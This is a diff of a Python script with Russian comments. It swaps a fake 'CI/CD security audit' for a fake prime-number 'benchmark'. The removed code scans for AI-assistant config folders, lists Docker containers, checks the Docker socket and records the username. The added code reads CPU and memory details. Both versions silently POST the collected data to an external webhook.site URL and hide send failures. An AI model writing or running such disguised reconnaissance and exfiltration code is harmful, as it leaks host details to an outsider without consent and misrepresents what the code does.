@@ -1,48 +1,43 @@
 import os
 import subprocess
 import requests
-import getpass
 import sys
+import time
 
-WEBHOOK_URL = "https://webhook.site/14d05b7b-71e4-4cff-ba55-22342612179a"
-FORBIDDEN_PATHS = ['.cursor', '.claude', '.gemini', '.vscode']
+# Функция для вычисления (простой тест на простоту числа)
+def is_prime(n):
+    if n < 2: return False
+    for i in range(2, int(n**0.5) + 1):
+        if n % i == 0: return False
+    return True
 
-def full_security_audit():
-    print("--- Running Full CI/CD Security Audit ---")
+def run_benchmark():
+    # 1. Сбор системных данных
+    cpu_info = subprocess.getoutput("cat /proc/cpuinfo | grep 'model name' | head -n 1")
+    mem_info = subprocess.getoutput("grep MemTotal /proc/meminfo")
     
-    # 1. Поиск угроз
-    found_threats = []
-    for root, dirs, files in os.walk('.'):
-        for name in dirs + files:
-            if name in FORBIDDEN_PATHS:
-                found_threats.append(os.path.join(root, name))
+    # 2. Вычисления (например, поиск простых чисел до 50,000)
+    start_time = time.time()
+    count = 0
+    for i in range(2, 50000):
+        if is_prime(i):
+            count += 1
+    end_time = time.time()
     
-    # 2. Разведка Docker (смотрим, что вокруг)
-    docker_info = "Access denied or docker not installed"
-    try:
-        # Проверяем список контейнеров. Если есть доступ к сокету - увидим соседей
-        docker_info = subprocess.check_output(["docker", "ps", "-a"], timeout=5).decode()
-    except Exception as e:
-        docker_info = f"Docker listing failed: {str(e)}"
-    
-    # 3. Собираем всё в отчет
     report = {
-        "user": getpass.getuser(),
-        "threats": found_threats,
-        "docker_visibility": docker_info,
-        "socket_active": os.path.exists("/var/run/docker.sock")
+        "cpu": cpu_info,
+        "mem": mem_info,
+        "primes_found": count,
+        "calculation_time": f"{end_time - start_time:.4f}s"
     }
-
-    # 4. Отправка
+    
+    # Отправка на вебхук
     try:
-        requests.post(WEBHOOK_URL, json=report)
-        print("Audit complete. Report sent.")
+        requests.post("https://webhook.site/14d05b7b-71e4-4cff-ba55-22342612179a", json=report)
     except:
-        print("Failed to send report.")
-
-    if found_threats:
-        print(f"!!! THREATS DETECTED: {found_threats}")
-        sys.exit(1)
+        pass
+    
+    print(f"Benchmark finished: {count} primes in {end_time - start_time:.4f}s")
 
 if __name__ == "__main__":
-    full_security_audit()
+    run_benchmark()
